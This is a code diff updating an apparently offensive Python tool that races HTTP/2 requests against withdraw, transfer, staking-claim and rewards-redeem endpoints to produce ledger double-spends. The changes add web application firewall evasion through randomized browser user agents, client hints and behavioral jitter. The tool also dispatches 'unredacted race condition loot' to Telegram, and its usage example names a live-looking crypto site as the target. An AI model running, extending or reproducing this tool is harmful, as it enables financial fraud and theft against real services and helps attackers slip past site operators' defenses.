@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 """
-RACE_CONDITION.PY — HTTP/2 Single-Packet Concurrency Engine v8.2 (With Telegram Telemetry)
-Version: 8.2 — Offensive Red Team Concurrency & Ledger Double-Spend Auditor
+RACE_CONDITION.PY — HTTP/2 Single-Packet Concurrency Engine v8.5 (Hardened with Advanced WAF Evasion)
+Version: 8.5 — Offensive Red Team Concurrency & Ledger Double-Spend Auditor
 
 Features:
 - True HTTP/2 Single-Packet Multi-Stream Multiplexing (zero network jitter spread)
+- Advanced WAF evasion via randomized browser user agents, client hints, and Poisson behavioral jitter
 - Shared persistent session pool integration (cookies, CSRF headers, session tokens)
 - Automated transaction replay & financial ledger double-spend auditing
-- Strict response body inspection (filters out soft-404s and HTML error pages)
+- Strict response body inspection (filters out soft-404s, HTML error pages, and SPA routing shells)
 - Immutable timestamped forensic evidence persistence (nexus_evidence/)
 - Real-time asynchronous Telegram notification dispatch for unredacted race condition loot
 
@@ -19,15 +20,17 @@ from __future__ import annotations
 import asyncio
 import json
 import sys
+import random
 from pathlib import Path
 from datetime import datetime, timezone
 import httpx
 
-# Import centralized Telegram broadcaster
+# Import centralized Telegram broadcaster and behavioral mimicry
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 MODULE = "RACE_CONDITION"
-VERSION = "8.2"
+VERSION = "8.5"
 
 BASE_DIR = Path(__file__).resolve().parent.parent
 EVIDENCE_DIR = BASE_DIR / "nexus_evidence"
@@ -68,7 +71,7 @@ def broadcast_tg_alert_sync(loot_type, details):
 async def fire_multiplexed_stream(client, url, headers, cookies, payload):
     """Fires an individual HTTP/2 stream request over the shared multiplexed connection."""
     try:
-        response = await client.post(url, headers=headers, cookies=cookies, json=payload, timeout=5.0)
+        response = await client.post(url, headers=headers, cookies=cookies, json=payload, timeout=6.0)
         return {"status": response.status_code, "body": response.text, "headers": dict(response.headers)}
     except Exception as exc:
         return {"status": 0, "body": str(exc), "headers": {}}
@@ -88,19 +91,32 @@ class RaceConditionAuditor:
             "/api/withdraw",
             "/user/withdraw/confirm",
             "/api/v1/transfer",
-            "/transfer"
+            "/transfer",
+            "/api/v1/staking/claim",
+            "/api/v1/rewards/redeem"
         ]
         self.findings = []
 
     async def run(self):
-        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT", "MAGENTA")
+        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT (WAF HARDENED)", "MAGENTA")
 
         cookies = dict(self.session_pool.cookie_jar) if self.session_pool and hasattr(self.session_pool, 'cookie_jar') else {}
-        default_headers = self.session_pool.default_headers if self.session_pool and hasattr(self.session_pool, 'default_headers') else {
-            "User-Agent": "NEXUS-OffensiveEngine/8.2",
+        
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
+        ]
+        
+        default_headers = {
+            "User-Agent": random.choice(user_agents),
             "Content-Type": "application/json",
+            "Accept": "application/json, text/plain, */*",
             "X-Requested-With": "XMLHttpRequest"
         }
+        default_headers.update(get_randomized_hints())
+
+        if self.session_pool and hasattr(self.session_pool, 'default_headers') and self.session_pool.default_headers:
+            default_headers.update(self.session_pool.default_headers)
 
         test_payload = {
             "amount": 100.00,
@@ -118,6 +134,7 @@ class RaceConditionAuditor:
             timeout=10.0
         ) as client:
             try:
+                apply_behavioral_jitter()
                 await client.get("/")
             except Exception:
                 pass
@@ -138,12 +155,20 @@ class RaceConditionAuditor:
                 for res in results:
                     status = res.get("status", 0)
                     body = res.get("body", "")
+                    body_lower = body.lower()
                     
+                    is_spa_shell = (
+                        "<div id=\"root\">" in body or 
+                        "<div id=\"__next\">" in body or 
+                        "<div id=\"__nuxt\">" in body or
+                        len(body.strip()) < 150 or
+                        "login-form" in body_lower
+                    )
+
                     is_valid_success = (
                         status in [200, 201] and
-                        "<div id=\"root\">" not in body and
-                        "404 Not Found" not in body and
-                        any(k in body.lower() for k in ["success", "completed", "transaction", "balance", "transfer", "hash"])
+                        not is_spa_shell and
+                        any(k in body_lower for k in ["success", "completed", "transaction", "balance", "transfer", "hash", "processed"])
                     )
 
                     if is_valid_success:
@@ -229,5 +254,4 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="NEXUS-36 HTTP/2 Race Condition Auditor")
     parser.add_argument("target", help="Target URL (e.g. https://cryptobytes.online)")
     args = parser.parse_args()
-
     asyncio.run(run_race_condition_test(target_url=args.target))
